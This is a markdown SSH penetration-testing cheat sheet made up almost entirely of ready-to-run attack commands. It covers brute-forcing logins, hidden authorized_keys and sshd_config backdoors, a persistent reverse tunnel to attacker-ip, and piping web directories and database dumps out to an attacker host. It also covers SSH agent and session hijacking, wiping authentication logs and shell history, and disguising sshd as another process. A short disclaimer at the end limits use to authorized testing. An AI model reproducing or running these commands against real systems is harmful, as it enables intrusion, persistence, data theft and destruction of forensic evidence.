# SSH Red Team & Penetration Testing Guide

## Reconnaissance & Enumeration

### SSH Service Detection

```bash
# Version detection
nmap -p 22 -sV <target>
nmap -p 22 --script ssh-hostkey <target>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" <target>

# Banner grabbing
nc <target> 22
telnet <target> 22

# Comprehensive enumeration
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <target>
```

### User Enumeration

```bash
# OpenSSH username enumeration (CVE-2018-15473)
python3 ssh-username-enum.py --port 22 --userList users.txt <target>

# Timing-based enumeration
for user in $(cat users.txt); do
  time ssh -o StrictHostKeyChecking=no $user@<target> 2>&1 | grep "Permission denied"
done
```

---

## Authentication Attacks

### Brute Force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -L users.txt -P passwords.txt ssh://<target> -t 4

# Medusa
medusa -h <target> -u root -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 --user root -P passwords.txt <target>

# Patator
patator ssh_login host=<target> user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### SSH Key Attacks

```bash
# Test known private keys
ssh -i /path/to/id_rsa user@<target>

# Find SSH keys on compromised system
find / -name id_rsa 2>/dev/null
find / -name id_ed25519 2>/dev/null
find / -name authorized_keys 2>/dev/null

# Search for keys in memory
grep -r "BEGIN.*PRIVATE KEY" /proc/*/environ 2>/dev/null
strings /proc/*/environ | grep -i ssh

# Crack encrypted private key
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Persistence & Backdoors

### Authorized Keys Backdoor

```bash
# Add your public key
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> ~/.ssh/authorized_keys

# Hidden with spaces
echo "ssh-rsa AAAAB3NzaC1yc2E...                    " >> ~/.ssh/authorized_keys

# With command restriction (appears legitimate)
echo 'command="/bin/bash" ssh-rsa AAAAB3NzaC1yc2E... backup@server' >> ~/.ssh/authorized_keys
```

### SSH Config Backdoor

Edit `/etc/ssh/sshd_config`:

```bash
PasswordAuthentication yes
PermitRootLogin yes

#additional authorized key
AuthorizedKeysFile .ssh/authorized_keys /tmp/.hidden_keys

# Enable forwarding
AllowTcpForwarding yes
GatewayPorts yes
```

Restart SSH:
```bash
systemctl restart sshd
/etc/init.d/ssh restart
```

---

## Pivoting & Lateral Movement

### Port Forwarding

```bash
# Local port forwarding
ssh -L 8080:internal-server:80 user@pivot-host

# Remote port forwarding
ssh -R 4444:localhost:4444 user@pivot-host

# Dynamic SOCKS proxy
ssh -D 1080 user@pivot-host
proxychains nmap -sT -Pn internal-network

# Multiple tunnels
ssh -L 8080:target1:80 -L 3389:target2:3389 -D 1080 user@pivot

# Background tunnel
ssh -f -N -L 8080:internal:80 user@pivot
```

### ProxyJump

```bash
# Single jump
ssh -J user@jump-host user@target

# Multiple jumps
ssh -J user@jump1,user@jump2 user@target
```

SSH Config:
```
Host target
    HostName 10.0.0.50
    User root
    ProxyJump jump-host
```

### Reverse SSH Tunnel

```bash
# On Machine 
ssh -R 2222:localhost:22 attacker@attacker-ip

# Persistent reverse tunnel
while true; do
  ssh -o StrictHostKeyChecking=no -R 2222:localhost:22 attacker@attacker-ip
  sleep 60
done &

# Using autossh
autossh -M 0 -R 2222:localhost:22 attacker@attacker-ip
```

---

## Advanced Exploitation

### SSH Man-in-the-Middle

```bash
# Using ssh-mitm
ssh-mitm server --remote-host <target> --listen-port 2222

# With ARP spoofing
arpspoof -i eth0 -t <victim> -r <gateway>
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
ssh-mitm --listen-port 2222 --remote-host <real-ssh-server>
```

### Weak Configuration Exploitation

```bash
# Test for vulnerable ciphers
nmap -p 22 --script ssh2-enum-algos <target> | grep cbc

# Force weak algorithm
ssh -c aes128-cbc user@host
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 user@host
```

---

## Data Exfiltration

```bash
# Compress and exfiltrate directory
tar czf - /var/www/ | ssh attacker@attacker-ip "cat > www-backup.tar.gz"

# Exfiltrate database
mysqldump -u root -p database | ssh attacker@attacker-ip "cat > db.sql"

# Encrypted exfiltration
tar czf - /sensitive/ | openssl enc -aes-256-cbc -salt | ssh attacker@attacker-ip "cat > encrypted.tar.gz.enc"
```

---

## Post-Exploitation

### Keylogging Sessions

```bash
# Log all commands
script /tmp/.ssh-session.log

# Monitor live SSH sessions
w
ps aux | grep sshd
strace -p <sshd-pid> -e read,write
```

### SSH Agent Hijacking

```bash
# Find SSH agent socket
echo $SSH_AUTH_SOCK
find /tmp -name "agent.*" 2>/dev/null

# Hijack agent
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXX
ssh-add -l
ssh-add -L

# Use for lateral movement
ssh -A user@pivot
```

### Session Hijacking

```bash
# Find active connections
netstat -tnp | grep :22

# Hijack using ControlMaster socket
ls ~/.ssh/sockets/
ssh -S ~/.ssh/sockets/user@host-22 user@host
```

---

## Evasion & Anti-Forensics

### Cover Tracks

```bash
# Clear logs
echo "" > /var/log/auth.log
echo "" > /var/log/secure
echo "" > ~/.ssh/known_hosts
echo "" > ~/.bash_history
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog

# Disable history for session
unset HISTFILE
export HISTSIZE=0

# Connect without traces
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@host

# Hide SSH process
cp /usr/sbin/sshd /tmp/httpd
/tmp/httpd -p 2222
```

### Alternative Ports

```bash
# Scan for non-standard SSH ports
nmap -p- --open -sV <target> | grep ssh

# Run SSH on alternate port
# Edit /etc/ssh/sshd_config
Port 443
Port 53

# Connect to alternate port
ssh -p 443 user@host
```

---

## Metasploit SSH Modules

```bash
# Login scanner
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME root
set PASSWORD toor
run

# Version scanner
use auxiliary/scanner/ssh/ssh_version

# User enumeration
use auxiliary/scanner/ssh/ssh_enumusers

# SSH key persistence
use post/linux/manage/sshkey_persistence
set SESSION 1
run

# Command execution
use auxiliary/admin/ssh/ssh_exec
set RHOSTS <target>
set USERNAME user
set PASSWORD pass
set CMD "whoami"
run
```

---

## Red Team SSH Config

```
# ~/.ssh/config

Host *
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel ERROR
    ServerAliveInterval 30
    ServerAliveCountMax 3
    Compression yes

Host pivot
    HostName compromised-host.com
    User www-data
    Port 22
    IdentityFile ~/.ssh/pivot_key
    DynamicForward 1080

Host internal-target
    HostName 10.0.0.50
    User root
    ProxyJump pivot
    IdentityFile ~/.ssh/internal_key

Host callback
    HostName attacker-vps.com
    User tunnel
    IdentityFile ~/.ssh/callback_key
    RemoteForward 2222 localhost:22
    ExitOnForwardFailure yes

Host legacy
    HostName old-server.local
    User admin
    KexAlgorithms +diffie-hellman-group1-sha1
    HostKeyAlgorithms +ssh-rsa,ssh-dss
    Ciphers +aes128-cbc,3des-cbc
    PubkeyAcceptedAlgorithms +ssh-rsa
```

---

## Defense Evasion Checklist

```bash
# No traces in known_hosts
ssh -o UserKnownHostsFile=/dev/null

# Clear history
history -c && rm ~/.bash_history

# Use non-standard ports
ssh -p 8443 user@host

# Tunnel through proxy
ssh -o ProxyCommand="nc -X connect -x proxy:3128 %h %p" user@host

# Throttle brute force
hydra -t 1 -w 3 ...

# Clean up before disconnect
rm ~/.ssh/authorized_keys.backup
```

---

## Legal Disclaimer

**These techniques are for authorized penetration testing and red team operations ONLY.**

If you don’t have permission,

this isn’t hacking —
it’s just noise.

Control is an illusion.
Access is real.

You don’t own a machine because you dominate it.

You own it because it lets you in.

And if it didn’t invite you,

you were never in control —
you were just making noise.
